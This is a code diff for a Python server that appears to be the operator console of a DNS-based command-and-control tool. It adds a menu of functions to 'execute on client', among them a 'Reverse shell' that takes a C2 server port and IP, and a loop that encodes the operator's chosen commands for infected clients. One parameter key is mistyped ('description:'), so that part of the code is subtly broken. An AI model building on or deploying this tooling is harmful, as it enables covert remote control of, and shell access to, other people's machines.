@@ -1,6 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf8 -*-
 
+import sys
 import random
 import string
 import base64
@@ -17,6 +18,28 @@ class Server:
     ASCII_VALUE_CHAR = {x:chr(x) for x in range(0,128)}
     # 128 characters per key
     PK_TOTAL_LENGTH = 128
+    FUNCTION_REFERENCE = {
+        1: {
+            'name': 'Print',
+            'params':[
+                {'name': '*args', 'type': 'List', 'description': 'Any number of strings to print'}
+            ]
+        },
+        2: {
+            'name': 'Reverse shell',
+            'params': [
+                {'name': 'Remote port', 'type': 'int', 'description': 'C2 server port'},
+                {'name': 'Remote server', 'type': 'str', 'description': 'IP address from C2 server'}
+            ]
+        },
+        3: {
+            'name': 'Sleep',
+            'params': [
+                {'name': 'Seconds', 'type':'int, float', 'description:': 'Seconds to sleep'}
+            ]
+        },
+
+    }
 
     def __init__(self, domain: str, port: int = 53):
         self.domain = domain
@@ -71,7 +94,7 @@ class Server:
             print('[!] Invalid function number data type.')
             return None
 
-        # If hex function number has one one char, add ad 0 after it. Remember that the function is reversed
+        # If hex function number has one char, add ad 0 after it. Remember that the function is reversed
         if len(reversed_hex_function_number) == 1:
             reversed_hex_function_number = '{}0'.format(reversed_hex_function_number)
 
@@ -179,7 +202,42 @@ class Server:
 
         return final_pk_e
 
+    def _serve_routine(self):
+        """ Routine to re-execute any number of times
+        """
+        option = -1
+        while not option in Server.FUNCTION_REFERENCE:
+            print('Choose a function to execute on client')
+            for i, j in Server.FUNCTION_REFERENCE.items():
+                print('\t{}) {}'.format(i, j['name']))
+            try:
+                option = int(input('Option: '))
+            except ValueError:
+                option = -1
+
+        params = []
+        if Server.FUNCTION_REFERENCE[option]['params']:
+            print('[*] Parameters for "{}" function'.format(Server.FUNCTION_REFERENCE[option]['name']))
+            for i in Server.FUNCTION_REFERENCE[option]['params']:
+                print('\t[*] Param name: {}'.format(i['name']))
+                print('\t[*] Param type: {}'.format(i['type']))
+                print('\t[*] Param description: {}'.format(i['description']))
+                params.extend(input('Value: ').split())
+
+        print()
+        self.encode(str(option), *params)
+        print()
+
+    def serve_forever(self):
+        while True:
+            try:
+                self._serve_routine()
+            except KeyboardInterrupt:
+                print('[!] Halted')
+                sys.exit(-1)
+
 
 if __name__ == '__main__':
     s = Server('example.com')
-    s.encode(1, 'Hello World!', 'I am printing two strings!')
+    # s.encode(1, 'Hello World!', 'I am printing two strings!')
+    s.serve_forever()
